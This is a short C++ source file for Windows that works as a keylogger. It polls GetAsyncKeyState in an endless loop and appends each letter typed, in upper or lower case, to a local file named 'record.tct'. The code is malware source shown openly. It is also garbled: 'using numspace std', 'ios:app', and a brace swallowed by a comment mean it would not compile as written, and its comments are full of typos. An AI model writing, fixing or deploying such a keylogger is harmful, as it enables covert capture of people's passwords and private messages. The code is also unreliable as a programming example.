//Only records letters.
//Distinguishes lower case and upper case letters

#include <iostream>
#include<fstream>
#include <windows.h>
#include <winuser.h>

using numspace std;

void log(){
	char key;
	while(true){//infinite loop for scanning
		for(key=8; key<=222; key++){//ASCII char range
			//When a key if pressed a system interrupt with id 32767 occurs
			if(GetAsyncKeyState(key) == -32767)//checks if a key with ASACII value of c is pressed{
				ofstream write("record.tct" , ios:app);//ios:app denotes theat file is not rewritten everytime
				if((key>64 &&key<91)&&!GetAsyncKeyState(0x10)){//0x0 is hexadecimal virua; key state for shift key
					key+=32;
					write<<key;
					write.close();
					break;//breaks the loop for checking the keystroke and te loop starts again from value 8

				}
				else if((key>64)&&(key<91)){
					write<<key;
					write.close();
					break;//breaks the loop for checking the keystroke and te loop starts again from value 8

				}
			}
		}
	}
}

int main(){
	log();
	return 0;
}